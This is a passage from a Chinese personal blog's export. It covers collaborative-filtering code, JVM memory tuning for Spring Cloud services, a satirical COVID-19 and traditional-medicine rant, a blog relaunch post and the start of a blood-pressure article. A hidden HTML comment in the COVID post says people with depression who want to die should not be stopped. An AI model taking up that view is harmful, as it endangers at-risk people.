<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'User based CF RMSE: '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>rmse<span class="token punctuation">(</span>user_prediction<span class="token punctuation">,</span> test_data_matrix<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Item based CF RMSE: '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>rmse<span class="token punctuation">(</span>item_prediction<span class="token punctuation">,</span> test_data_matrix<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>SVD分解的方法，其中k是特征值个数，指定将分解为<span class="math inline">\(m*k\)</span>和<span class="math inline">\(k*n\)</span>，中间的对角矩阵有k个特征值 &gt;k: int, optional,Number of singular values and vectors to compute. Must be 1 &lt;= k &lt; min(A.shape)</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">u<span class="token punctuation">,</span> s<span class="token punctuation">,</span> vt <span class="token operator">=</span> svds<span class="token punctuation">(</span>train_data_matrix<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">500</span><span class="token punctuation">)</span>
s_diag_matrix <span class="token operator">=</span> np<span class="token punctuation">.</span>diag<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
X_pred <span class="token operator">=</span> np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>u<span class="token punctuation">,</span> s_diag_matrix<span class="token punctuation">)</span><span class="token punctuation">,</span> vt<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'User-based CF MSE: '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>rmse<span class="token punctuation">(</span>X_pred<span class="token punctuation">,</span> test_data_matrix<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>参考</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9sdW1pbmdkb25nLmNuL3JlY29tbWVuZGF0aW9uLWFsZ29yaXRobS1iYXNlZC1vbi1tYXRyaXgtZGVjb21wb3NpdGlvbi5odG1s">基于矩阵分解的推荐算法<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3FjeW1reHljL1JlY1N5cw==">项亮的《推荐系统实践》的代码实现<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly9saWFtLnBhZ2UvMjAxOS8wMy8yNS9GYWN0b3JpemF0aW9uLU1hY2hpbmUv">谈谈因子分解机模型（FM）<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>笔记&amp;札记</category>
      </categories>
      <tags>
        <tag>推荐系统</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次Spring Cloud上线内存优化</title>
    <url>/spring-cloud-performance-optimization/</url>
    <content><![CDATA[<p>没钱买 256G 内存的服务器的人是这样的</p>
<span id="more"></span>
<p>其实本来想说Spring Cloud上线性能优化的，想了想不是，这波，这波啊是性能反向优化（性能不性能的已经不重要了，用户量应该也不太大，先把成本压下来再说吧）。</p>
<h2 id="怎么回事">怎么回事</h2>
<p>朋友们好啊， 我是浑元形意太极门掌门人马保国。 刚才有个朋友问我： “马老师发生肾么事了？” 我说怎么回事。给我发了几张截图。 我一看！哦，原来是昨天，有两个微服务， 上线一天，一个内存<strong>996M</strong>，一个内存<strong>888M</strong>。 <img src="/spring-cloud-performance-optimization/image-20201118095216036.png" alt="它也说，啊，它截图也说了" /> <del>其实是我调了一下凑出来的这两个数</del> 它说要吃一点资源，我说可以。 诶，我一说它“啪”就站起来了，很快啊！ 然后上来就是，一个虚拟机，一个Docker，一个mysql，我全部防出去，防出去了啊。 防出去以后，自然是，上线部署以点到为止。没有限制它内存。 我笑一下，准备收工，因为这时间，按传统部署的点到为止，服务器已经够用了。我收工的时间回宿舍啦。 它突然袭击，还有8个微服务，来打我机子，啊。我大意了啊，没有闪。 来，抢！来，偷吃，我DDR3的，老内存，这好吗？这不好。 它说它是乱占用的，它可不是乱占用的。一个996，一个888，这明显是，有备而来！</p>
<h2 id="服务器">服务器</h2>
<p>正常的操作是加钱上大一点的内存，但是大内存VPS、杜甫它贵啊。以套路云香港为例，明晃晃的抢钱。而且16G内存及以上的版本已经无了。其他华南华北的VPS更贵一点，而且全都是1M小水管。</p>
<figure>
<img src="/spring-cloud-performance-optimization/image-20201120103456546.png" alt="套路云香港" /><figcaption aria-hidden="true">套路云香港</figcaption>
</figure>
<p><del>服务器内存比本地台式还小是要出大问题的,上线炸内存警告</del></p>
<p>102网吧里面服务器是有32G内存的，然而网速.....</p>
<p>服务器的套餐是学校20一个月20M的普通套餐（20M是下载速度，要想对外服务，上传速度可能只有几M）同为校园网。而且你电的教育网会有各种小问题，比如逢年过节十一国庆公网IP就被信息中心收回去了、校园网出口线路很差、域名也不好搞。</p>
<p>加钱换校园网的套餐也没用，你电沙河主楼的网速我很少见有人跑出过100Mbps以上的。而且问题是主楼那个墙里的网线，貌似是百兆网...教研室的老交换机上面还赫然贴着一张2010年的封条。。。</p>
<p>VPS的话选Debian，根据我多年用128M-1G内存VPS灵车漂移的印象，占用资源最少的少的就这个了（CentOS占用&gt;Ubuntu Server&gt;Debian&gt;VSP2ARCH）</p>
<p><del>其实我很想VPS2ARCH再次灵车漂移，但是毕竟是要出事背锅生产环境我不敢</del></p>
<h2 id="考虑扔掉docker">考虑扔掉Docker</h2>
<p>直接裸跑吧，不要再套几层了。</p>
<h2 id="其他能扔的">其他能扔的</h2>
<h3 id="redis">Redis</h3>
<p>这么点用户量没啥缓存的必要，关了</p>
<h3 id="nacos">NACOS</h3>
<p>动态注册发现之类的单机版也没必要用了，直接手动排查和维护吧。</p>
<p>NACOS的内存占用单机版在几百M左右（默认参数是<code>-Xms512m -Xmx512m -Xmn256m</code>，可以在startup.sh里面改，不过还是直接关掉比较清静。</p>
<figure>
<img src="/spring-cloud-performance-optimization/image-20201120212626344.png" alt="NACOS内存使用情况" /><figcaption aria-hidden="true">NACOS内存使用情况</figcaption>
</figure>
<h2 id="jdk版本">JDK版本</h2>
<p>之前一直用的java8-Openjdk。</p>
<p>后来看到据说 Oracle JDK 和 Open JDK 有性能差异，不同版本的jdk也有性能差异，java 8 的64位版本和32位版本也有区别（据说不超过2G内存的情况下貌似32位会好一些）</p>
<p>那就都试试吧。在Arch上打的jar包，就在本地测试了一下，没在服务器上试。</p>
<h3 id="不同版本内存占用">不同版本内存占用</h3>
<p>Arch有个脚本，可以切换OpenJDK的版本，</p>
<figure>
<img src="/spring-cloud-performance-optimization/image-20201124123102440.png" alt="archlinux-java" /><figcaption aria-hidden="true">archlinux-java</figcaption>
</figure>
<p>Oracle JDK 由于甲骨文公司不武德，跟各路开源组织（以及很多闭源福报公司）都闹僵了，Arch仓库不提供支持，得自己安装。</p>
<p>从AUR安装结果报错说<code>**==&gt; ERROR:** **Failure while downloading manual://jdk-8u271-linux-x64.tar.gz**    **Aborting...** error downloading sources: jdk8</code>，看了一下还得跑到<span class="exturl" data-url="aHR0cHM6Ly93d3cub3JhY2xlLmNvbS9qYXZhL3RlY2hub2xvZ2llcy9qYXZhc2UvamF2YXNlLWpkazgtZG93bmxvYWRzLmh0bWw=">Oracle<i class="fa fa-external-link-alt"></i></span>那里去注册下载然后pkgbuild</p>
<p>从阿里云的镜像可以不用注册下载<span class="exturl" data-url="aHR0cHM6Ly9jb2RlLmFsaXl1bi5jb20va2FyL29qZGs4LTh1MjcxL3Jhdy9tYXN0ZXIvamRrLTh1MjcxLWxpbnV4LXg2NC50YXIuZ3o=">jdk8<i class="fa fa-external-link-alt"></i></span>和<span class="exturl" data-url="aHR0cHM6Ly9jb2RlLmFsaXl1bi5jb20va2FyL29qZGsxMS0xMS4wLjkvcmF3L21hc3Rlci9qZGstMTEuMC45X2xpbnV4LXg2NF9iaW4udGFyLmd6">jdk11<i class="fa fa-external-link-alt"></i></span>，然后扔到<code>~/Downloads</code>里面，再运行<code>yay -Syu jdk8 jdk11</code>就好了。</p>
<p>java8 和java11 的编译通过了，看起来Oracle JDK效果是要好一点(也只有十几兆的微弱差别，感觉区别不大)，java14和java15还没试，以后有空再说。</p>
<h3 id="位和64位的差异">32位和64位的差异</h3>
<p>试了一下java8的32位和64位，貌似有一点区别，32位是节省一点资源。大概差距也在十几兆左右，区别不太大。</p>
<h2 id="jvm调参">JVM调参</h2>
<p>大概调了调，冲着压榨内存占用调的</p>
<p>几个比较重要的参数：</p>
<ul>
<li>-Xms</li>
<li>-Xmx</li>
<li></li>
</ul>
<p>暂时把参数改成这样子了：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -Xms16m -Xmx32m -XX:MaxMetaspaceSize<span class="token operator">=</span>48m -XX:CompressedClassSpaceSize<span class="token operator">=</span>8m -Xss256k -Xmn300m -XX:InitialCodeCacheSize<span class="token operator">=</span>4m -XX:ReservedCodeCacheSize<span class="token operator">=</span>8m -XX:MaxDirectMemorySize<span class="token operator">=</span>16m -jar service_ucenter-0.0.1-SNAPSHOT.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>不太敢压榨的太狠，怕上线了OutofMemory。</p>
<p>现在每个jar包跑起来大概内存占用在300M以下。</p>
<h2 id="压缩mysql内存占用">压缩MySQL内存占用</h2>
<p>MySQL的内存占用压缩一下还是很低的，之前还在用wordpress的时候128M内存的灵车VPS跑起来没什么大问题。</p>
<h2 id="图片压缩">图片压缩</h2>
<p>浏览器F12 可以看到，在加载首页的时候，大部分html、css、js资源在300ms内加载完成，500ms以后开始加载图床资源，一直到最4000ms以后才加载完成。</p>
<figure>
<img src="/spring-cloud-performance-optimization/image-20201124170847425.png" alt="加载首页" /><figcaption aria-hidden="true">加载首页</figcaption>
</figure>
<p>下图是打开首页时png图片（阿里云图床，大小 926k）的时候的加载速度，耗时最长的就是下载图片的过程。</p>
<figure>
<img src="/spring-cloud-performance-optimization/image-20201124165004678.png" alt="image load speed" /><figcaption aria-hidden="true">image load speed</figcaption>
</figure>
<p>主要就是压缩图片大小了，jpg和png全换成webp，今年6月份Safari14已经支持webp了，现在主流浏览器都问题不大。</p>
<h2 id="重构">重构</h2>
<p>暂时不考虑，不过上线的时候砍掉几个无关紧要的功能倒是问题不大，这样只开4个微服务就差不多能用了。</p>
<h2 id="最终结果">最终结果</h2>
<p>如果不跑别的东西，一个4G内存的VPS已经够用了。</p>
<figure>
<img src="/spring-cloud-performance-optimization/image-20201124120817137.png" alt="首页" /><figcaption aria-hidden="true">首页</figcaption>
</figure>
<figure>
<img src="/spring-cloud-performance-optimization/image-20201124120944296.png" alt="全部课程页面" /><figcaption aria-hidden="true">全部课程页面</figcaption>
</figure>
<h2 id="参考">参考</h2>
<p>https://developers.redhat.com/blog/2017/04/04/openjdk-and-containers/</p>
<p>https://blog.kelu.org/tech/2018/05/30/running-a-jvm-in-a-container-without-getting-killed.html</p>
<p>https://www.cnblogs.com/ityouknow/p/5610232.html</p>
<p>https://github.com/flyleft/tip/blob/master/blog/springboot%E6%80%A7%E8%83%BD%E8%B0%83%E4%BC%98.md</p>
<p>https://medium.com/<span class="citation" data-cites="yortuc/jvm-memory-allocation-in-docker-container-a26bbce3a3f2">@yortuc/jvm-memory-allocation-in-docker-container-a26bbce3a3f2</span></p>
]]></content>
      <categories>
        <category>102网吧日常</category>
      </categories>
      <tags>
        <tag>jvm</tag>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title>毕竟狂澜挽不回，遽怜遗蜕化飞灰</title>
    <url>/SARS-cov-2/</url>
    <content><![CDATA[<p>So this is how liberty die, with thunderous applause <span id="more"></span></p>
<p>想来我也算半个医学逃兵，颇有些惭愧（元旦那会听某个学医的群友在电报说武汉不太平，然而我怂，即没敢跟周围任何熟人说也没敢发到国内群里，完美逃过了央视训诫.......</p>
<h2 id="一管就乱一放就死">一管就乱，一放就死</h2>
<p>经此一疫，又有一群不食人间烟火的人黄粱梦醒，纷纷如丧考妣，惊讶愤怒心痛，只觉所住非人间。你们是第一天住在人间吗？或许是承平日久了，想想这十几年真是好日子过多了，真觉得和平发展充满爱是世界主流了，这一片绿油油的韭菜不割都对不住韭菜。就像之前的故宫大G，愤怒可以理解，惊讶就太外宾了。 难道你们不知道权贵一直如此？ 难道你们不知道公卫和防疫本来就是个摆设？ 难道你们第一天接触慈善和红会？ 难道你们第一天活在地球？</p>
<p>然后在恐慌下自相践踏，死伤甚众，隔离这么严疫情没把你们搞死经济先崩了。</p>
<h2 id="忘记历史就会梅开二度">忘记历史就会梅开二度</h2>
<blockquote>
<p>社会主义没有失业,那叫下岗</p>
</blockquote>
<p>有人怕了，就怕跟SARS扯上关系啊</p>
<p>这病毒终于还是有了个名字叫SARS-cov-2，然而国内官媒一个个都有意回避SARS的说法，甚至绝口不提非典，非得叫新型冠状病毒，却又说不是SARS 我们随便点开一个百科,比如默沙东手册:</p>
<blockquote>
<p>严重急性呼吸综合征（SARS）是由SARS冠状病毒（SARS-CoV）引起的严重急性呼吸道疾病。</p>
</blockquote>
<p>这可不就是SARS，这次疾病就叫 SARS2 我看正合适。 WHO（Winne Happy Orgnization）不管这个叫 SARS，当然了，他们还满口可防可控不列疫区，我建议WHO加大力度，力度再大点就可以被总书记<strong>亲自批准</strong>火线入党了，岂不美哉</p>
<p>你们还是说点人话吧，什么2019-nCov啊，什么NCP啊，特色社会主义都能叫社会主义，这新型冠状病毒都不算SARS？</p>
<blockquote>
<p>黑格尔在某个地方说过，一切伟大的世界历史事变和人物，可以说都出现两次。他忘记补充一点：第一次是作为悲剧出现，第二次是作为笑剧出现。 ----左壬最爱的鹿克斯祖师《路易·波拿巴的雾月十八》 太阳底下并无新鲜事 ----某些保守派右壬最喜欢的圣经</p>
</blockquote>
<h2 id="国士垂垂老矣">国士垂垂老矣</h2>
<p>元旦那会我觉得这个可能要闹大,当时也没想到会闹成今天这个样子。</p>
<p>03年非典，蒋先生做出了青史留名的举动，涛哥不戴口罩亲临广州街头，臊子面稳住了北京。今天只留下了一个又一个笑话，让大家觉得“彼可取而代也”</p>
<p>大家一边吹捧钟南山，一边骂双黄连和可防可控，我看得哭笑不得。 钟南山当年的板蓝根和可防可控大家都忘了吗？莲花清瘟都忘了吗？ 他可不是糊涂，他自己是不信的。他父亲都是反中医的。</p>
<figure>
<img src="/SARS-cov-2/板蓝根.webp" alt="板蓝根" /><figcaption aria-hidden="true">板蓝根</figcaption>
</figure>
<p>以下内容直接复制自维基百科 &gt;2月11日上午，广州市政府召开新闻发布会公布广州地区非典型肺炎情况，称所有病人的病情均在控制当中。强调对于广州千万人口300多人染病是个很小的比例，非典型肺炎只是局部发生，河源中山等市已无新发病例报告。还解释了2月前前阶段没有公布情况的原因是：河源中山等地的患者经过治疗大多已康复或好转没有再发病，非典型肺炎并不是法定报告传染病，而发病人数305例并不算多。负责人强调会按传染病法公布疫情。 &gt;同日下午，广东省卫生厅举行情况通报会。中国工程院院士钟南山表示，市民到公众场所进行正常的活动是不会受到感染的，宣布广东大中小学将会如期开学。专家还指出，从临床角度看，可能是由病毒引起的，也有可能是病毒的亚型或变种引起的。对于患者的治疗都是采用“对症下药”的方法。</p>
<p>当然了，肯定有人让我闭嘴，我算个什么东西，哎，我还真不算个东西。 我一个稀里糊涂读了几年生物医学工程的工科狗，给自己脸上贴金也只能算半个医学相关闲杂人等，跑到知乎<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>去说两句，能引来几千个人追着骂我。（2020年的，2013年前的应该不能）</p>
<p>那我就贴一点<span class="exturl" data-url="aHR0cHM6Ly93d3cud2VpYm8uY29tL3UvMTgyOTg3MDIxMg==">小儿外科裴医生<i class="fa fa-external-link-alt"></i></span>的话 (以下内容大段粘贴，指不定哪天号就没了，留个备份，前几天刚炸了一大批怼中医的)</p>
<blockquote>
<p>小儿外科裴医生<br />
2019-9-8 09:36 来自 iPhone客户端 你要是以为钟南山在这个“科普”中讲到莲花清瘟胶囊是无意的，或者他只是因为没有了解这个药，那就太幼稚了，人家不蠢，只是没有节操，为了利益，用自己的学术地位给那些没用的药站台背书，就是恶。<span class="exturl" data-url="aHR0cDovL2hiLmNoaW5hZGFpbHkuY29tLmNuL2EvMjAxOTA5LzA3L1dTNWQ3MzhmNjdhMzEwOTlhYjk5NWRlOTNmLmh0bWw=">O“知感冒·防流感——全民科普公益行”活动在汉举... ​​​​<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>这活动还有视频哦（太长了就只贴个图好了）</p>
<p><img src="/SARS-cov-2/莲花清瘟.webp" /></p>
<p>这底下有个评论：</p>
<blockquote>
<p>fanbobb：如果有人问我，连我们最该拥有权威的院士，前几天还有正能量新闻的院士，都宣传中成药，你还成天说中药是骗人的吗？我作为一个非医学专业的普通人还真有点哑口无言</p>
</blockquote>
<p>我也哑口无言。</p>
<blockquote>
<p>小儿外科裴医生 2月2日 22:07 来自 iPhone 11 Pro 面对一个大家都不太了解的病毒，被感染了有什么丢脸，为什么要用此这么恶毒的词？我觉得他比钟南山客观、务实、专业、真实多了。//<span class="citation" data-cites="st5873:这样草包还有脸出来到处接受采访">@st5873:这样草包还有脸出来到处接受采访</span> <span class="citation" data-cites="小儿外科裴医生">@小儿外科裴医生</span> 中青报对这篇对@北大呼吸发哥 的访谈很不错，推荐大家看看。O卫健委专家组成员王广发出院了，回答了我们8... ​​​​</p>
</blockquote>
<blockquote>
<p>阿瓦达啃大瓜1633：回复@蓝小诺CC:几年前亲耳听钟老板在欧洲呼吸病年会分会上演讲说他们团队研究治疗H1N1板蓝根有效，莲花清韵胶囊有效，当初差点以为听错了，那时才明白钟老板那一刻的身份是行政官员不是医生。</p>
</blockquote>
<p>下面这段已经被删了,戳到某些人的脊梁骨了。这里我手动加粗，以免太长不看的读者在跳读我写的这一堆垃圾时错过重点内容</p>
<blockquote>
<p><span class="citation" data-cites="小儿外科裴医生:专业我就说几个词吧">@小儿外科裴医生:专业我就说几个词吧</span>：<strong>连花清瘟、板蓝根、装修致白血病、兰菌净、羧甲司坦、口罩</strong>。//<span class="citation" data-cites="嘛咪嘛咪-hong:所以我想知道钟南山哪儿不客观">@嘛咪嘛咪-hong:所以我想知道钟南山哪儿不客观</span>，不务实，不专业，不真实呢？（非杠，真心请教）</p>
</blockquote>
<p>当然很多都删了，还有很多没有说出口（很多话我也没说出口）</p>
<blockquote>
<p>昨天在隔壁号我又有一篇文章被删了，算上之前被删的和推送不出去的，整个疫情期我有约1/10的文章没法见人，昨天看到棒棒医生的那篇循证的崩溃的文章也被删了，医学专业人员连专业问题都不能讨论和发言，那可能是这块土地真的不再需要专业和科学了。 ​​​​</p>
</blockquote>
<p>19年10月钟南山还在搞：<span class="exturl" data-url="aHR0cHM6Ly93d3cudGhlcGFwZXIuY24vbmV3c0RldGFpbF9mb3J3YXJkXzQ3MzExMDY=">钟南山：正研发新版板蓝根，药效或强五六倍<i class="fa fa-external-link-alt"></i></span>，还给莲花清瘟站台，对了，还有虫草呢（就是内含重金属，改变了平西王历史的进程的那个虫草）</p>
<p><img src="/SARS-cov-2/冬虫夏草.webp" /></p>
<p>什么叫国士无双啊，战术后仰</p>
<p><img src="/SARS-cov-2/pilipili.webp" /></p>
<p>另，友情提示，李兰娟的人品、水平和能力还不如钟南山。</p>
<p>没多少人提起，蒋先生的往事 据说蒋先生现在身体也不太好，唉</p>
<figure>
<img src="/SARS-cov-2/蒋彦永.webp" alt="蒋彦永先生" /><figcaption aria-hidden="true">蒋彦永先生</figcaption>
</figure>
<p>“我之所以能直面现实，是因为我相信我们的国家。因为国家如果能从我提供的这些情况吸取一定的教训，因此建立好公共防疫制度，从SARS的挑战与困境中站起来，获得全世界人民的信任。”</p>
<p>这次怕是让老爷子心寒了</p>
<p>当然某人青年时代就亲自读过莎士比亚，并且在15年引经据典告诉过我们：“凡是过去，皆为序章”。<a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a></p>
<p><em>我将无我，亲自指挥</em></p>
<p>正常表现罢了</p>
<blockquote>
<p>因笑王谢诸人，登高怀远，也学英雄涕</p>
</blockquote>
<!-- 

建议大家多屯点粮食

有钱记得做空美股（当然你也可以拿期权做空A股，只要你不怕投机倒把当场击毙）

对野生动物保护持续悲观（你看见之前环保部门煤改气了吧）

再多说两句，流浪猫狗应该跟本次非典没有太大关系，不管有没有关系，流浪猫狗本就应该组织扑杀（收容和安乐是宠保人士和猫奴狗奴的事，政府以极大浪费~~纳税人~~韭菜的血汗钱进行收容和安乐都是不合适的，TNR属于迁就猫奴狗奴的绥靖行为，同样不可取）。
昆明滇池的红嘴鸥和黔灵山公园的猕猴今年缺少游客喂食，景区组织投喂，这是十分不好的。

下面贴一些鸟类爱好者的话：

[中土饲养员]：有研究表明人为投喂淀粉类的面包蛋糕等会降低各种鸥类育雏的成功率，但是还好红嘴鸥只把昆明当成补充体力的中转站
[JK协捕队2世](https://weibo.com/u/6552893675)：
[漂泊极北鲵](https://weibo.com/u/5832997504)：...首先 这是红嘴鸥Chroicocephalus ridibundus 不是海鸥Larus canus 其次这些鸥已经被喂得彻底与自然环境分离了 这是在毒害它们
没事请与野生动物保持距离，不要乱摸、投喂，除了保育和救助等都不要打扰动物
动物园和景区里的也不行，很多动物园和景区做得都不好，禁止投喂的牌子并不管用，工作人员也制止不过来

我只是半个动物爱好者，这里就不自己扯淡了, 这是一篇土澳学生物的博主写一篇长微博：<https://weibo.com/3962135262/Isy79BHPA>
我抄一点过来:
>人类的食物，如面包、薯条、饼干，高油高盐，高热量高糖分，对野生动物的健康极为不利，多表现为肥胖、肾衰竭、毛发脱落等。因为人类的饮食根本不是它们自然食物链的一部分。不天然的饮食及其附属物，例如塑料袋、油污，也会污染野生动物的自然栖息地。
>亲密接触野生动物增加疾病的传播概率，这点在当下这个时候，想必不用再过多说明了吧？某市以投喂红嘴鸥为荣的，鸟类身上携带什么疾病来着，禽流感啊，好自为之！去高原上摸旱獭喂食旱獭，自私且无耻，将自己暴露在甲级传染病鼠疫病原的触碰范围内，你又为你家人想过吗？犰狳是恐怖的麻风病宿主，很多小型食肉动物传播狂犬病，动物身体体表和体内的各种寄生虫，野生动物从来都不好惹。
>使野生动物依赖人类获取食物。这次疫情限制出行，很多问题就暴露出来了，为什么贵州那群猴子和某市的红嘴鸥离不开人的投喂了？这是个恶性循环啊，本来就不该投喂野生动物，养成依赖了，现在甩不了手，离不开人了，出了事动物们自己不会觅食，纷纷饿死，有得去投喂，这个循环刹不住车了，你觉得是好事吗。就说红嘴鸥吧，这种鸟类本来还是候鸟，人家到点了想飞走就飞走，想留下就留下，一投喂全留下了，这基数不断变大，竞争压力也不断变大。红嘴鸥的自然种群数量庞大，适应力很好，年前跑鸟类调查，上万只反正是随随便便看到了，它们也不是什么濒危物种，完全不依靠人类“救援”。所以这事，从一开始做的就不对，不是说你现在不投喂要出问题，是一开始就压根不该投喂，动物不是人，它脑子里只有吃和繁殖，这样强行转变了它们的生存策略，到最后只能是出问题。

还有这方面的疑问不建议问我，请直接去问他们

中医早已变成一个庞大的利益集团，随便一个阿胶之类的体量都在鸿茅药酒十倍以上。总规模和能量加起来应该不低于清真食品产业链。
我不想说什么中医了，我也不拦着，谁爱信谁信。以前看到有人想不开，我都觉得应该劝劝，现在抑郁症想自杀的人我都觉得不应该拦着，信中医就我就更不反对了，都是个人选择，尊重个人意愿。非公共场合抽烟也是个人意愿，还能成为光荣的~~纳税人~~烟草局韭菜。喝中药对他人危害并不高于香烟，还能解决医保和老龄化的难题，顺便进行智商筛选。

在现代医学已经发展到这个样子的今天，再想想《赠医者汤伯高序》文末“嗟夫，使世之医皆若虚、伯高，信之者皆吾里之人，巫其能久胜矣乎”，问题的答案是：你别说，还真能！

楚俗信巫不信医，今天群魔乱舞自称中医的一群人，基本都是跳大神的巫医，谋财害命之徒。可以粗暴的认为是一个宗教性质的东西。

再有人问中医怎样，我建议你们这样安利他们：试试恒河水，这个纯天然，效果也很好，还免费

死生有命，富贵在天
善哉，善哉

>庚子年春，大雪，惊雷，天有五日,瘟疫封城 -->
<section class="footnotes" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p>https://www.zhihu.com/question/28634829<a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn2" role="doc-endnote"><p>http://politics.people.com.cn/n/2015/1021/c1001-27724579.html<a href="#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>
]]></content>
      <categories>
        <category>彼黍离离</category>
      </categories>
  </entry>
  <entry>
    <title>重启博客</title>
    <url>/1a9a/</url>
    <content><![CDATA[<p>新博客又开通了(搬家)，不定期更新</p>
<span id="more"></span>
<p>原域名到期，加上之前的Wordpress网站不太喜欢，索性换到Hexo了，主题域名什么的都全换了。没换Hugo是因为没发现和Next一样这么喜欢的主题，这主题让我感到这个页面的却就是一个博客应该有的样子。</p>
<p>倒不是说这个主题多好看，它是我印象里博客的样子，让我找回了还是个小朋友的时候第一次注册博客的感觉。对呀，博客就长这个样子。左边是导航栏，下面一小栏放头像和放点徽章挂件；中间是文章，文章最下面是评论。再随便加个背景，简直完美。咿，空荡荡的好像还少点什么；是弹窗小广告，这个就算了.....</p>
<p>最早的时候沉迷三维弹球和扫雷，以及桌面屏保。后来开始上网，已经错过了聊天室的时代，也错过了拨号上网和Telnet论坛的时代，论坛已经流行用Discuz了，QQ号已经8位了。跟风注册了雅虎伊妹儿和搜狐博客，以及一些论坛帐号，开始了网上冲浪。后来换到Wordpress了，加上一个穷学生手头零花钱也不多，中间关了两次没有续上。</p>
<p>偶当年还是一只小网虫的时候，并不是特别喜欢发博客，喜欢泡在BBS里，写的东西也都喜欢放在BBS里水帖。论坛里看的人比较多，偶尔斑竹还会出来给加个精。大概从15年开始BBS一个个都亡了。有的因为用户大量出走宣布死亡，有的像贴吧一样开始杀鸡取卵式变现挣钱，还有的因为政策原因关了。有的多次改版丢了好多老帖子，有的格式也乱了，老用户抱怨出走。有的一直停留在远古版本的Discuz，然后有一天站被黑了....</p>
<p>看多了Flarum的新论坛现在偶尔点进一些没见过的Discuz论坛还是会瞬间恍惚，仿佛又回到了当年</p>
<p>有的是还没亡却从当年的人声鼎沸变得门可罗雀，不时传来哪个一年到头也没几个人说话的论坛站长支撑不下去又要关站了的消息。认识的好多网友也有逐渐沉寂，失去了联系。</p>
<p>之前博客里的东西不适合放出来，就默默存在硬盘里了。在论坛里写的东西就放在论坛里和BBS一起消亡吧。</p>
<blockquote class="blockquote-center">
<p>山中友，试高吟楚些，重与招魂</p>

</blockquote>
<figure>
<img src="/1a9a/cyperpunk.png" alt="Welcome" /><figcaption aria-hidden="true">Welcome</figcaption>
</figure>
]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
      <tags>
        <tag>杂记</tag>
      </tags>
  </entry>
  <entry>
    <title>无创血压计</title>
    <url>/2e86/</url>
    <content><![CDATA[<p>血压是人体最主要的传统监护指标之一，血压的测量在医学上具有重要意义。相比于有创的测量方法，无创测量具有方便和不易感染的优点，在血压测量中被广泛采用。经典的无创测量方法主要有柯氏音法、超声法。此外，能够连续测量的动脉张力法、容积补偿法、脉搏波速传导法和脉搏波特征参数测定法也有着广阔的应用空间和市场前景。</p>
<span id="more"></span>
<h2 id="血压测量原理及特点">血压测量原理及特点</h2>
<p>血压是重要的人体生理参数指标，具有重要的医学意义，是高血压及休克等多种疾病状态的关键性临床指标。在临床上,测量各个心腔及周围血管的血压,是评估心血管系统功能的重要指标之一,目前已经有多种方法测定血压波形和血压值。常用的血压测量方法有准确度较高的有创血压监测和无创血压监测。对于不同的应用场景和需求，也产生了多种监测设备，主要分为家庭使用的便携设备、医院常规检查设备以及重症病人的监测设备。</p>
<p>有创的测量手段多用于医院临床监护，被认为是血压测量的金标准，包括中心静脉压力监测、创伤性动脉血压监测、血流动力学监测和血压测量中的动态响应优化。目前已经应用于各大医院的重症监护室、手术室、心脏导管室。 有创的监测手段测量精度高，多集成在医院的综合性生理指标监测设备，该方法的血压测量精度和连续性已经较为成熟，足够用于分析。有创带来的感染问题可以由医院的护理人员处理。</p>
